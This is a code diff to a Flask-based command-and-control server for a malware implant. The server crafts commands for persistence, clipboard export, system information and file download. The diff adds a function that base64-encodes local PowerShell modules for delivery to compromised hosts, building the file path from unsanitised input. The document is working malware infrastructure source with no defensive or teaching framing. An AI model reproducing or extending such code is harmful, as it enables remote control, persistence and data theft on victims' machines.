@@ -1,6 +1,7 @@
 from flask import Flask, make_response, request
 import base64
 from uuid import uuid4
+import os
 
 from Implant.Implant import ImplantSingleton
 from Data.Database import Database
@@ -10,6 +11,7 @@ db = Database()
 
 app = Flask(str(uuid4()))
 app.config['SECRET_KEY'] = str(uuid4())
+
 
 # Adding the functions which manage encoding built in commands for transfer
 def craft_sound_file(path):
@@ -43,9 +45,25 @@ def craft_enable_persistence(value_dict):
 def craft_sys_info(value_dict):
     return str(value_dict['type'])
 
+
 def craft_export_clipboard(value_dict):
     return str(value_dict['type'])
 
+
+def craft_load_module(value_dict):
+    print(value_dict['args'])
+    try:
+        with open(str(os.getcwd()+"/Storage/implant_resources/modules/"+value_dict['args']+".ps1"), 'r') as fileh:
+            to_encode = "{}::{}".format(value_dict['args'], fileh.read())
+            load_module_string = "LM" + base64.b64encode(to_encode.encode()).decode()
+            print("Load module crafted successfully: {}".format(load_module_string))
+            return load_module_string
+    except Exception as e:
+        # These exceptions should be added to a log file.
+        print("Load module failed")
+        pass
+
+    return str("==")
 
 #
 preprocessing = {
@@ -55,7 +73,8 @@ preprocessing = {
     "FD": craft_file_download,
     "EP": craft_enable_persistence,
     "SI": craft_sys_info,
-    "EC": craft_export_clipboard
+    "EC": craft_export_clipboard,
+    "LM": craft_load_module
     }
 
 
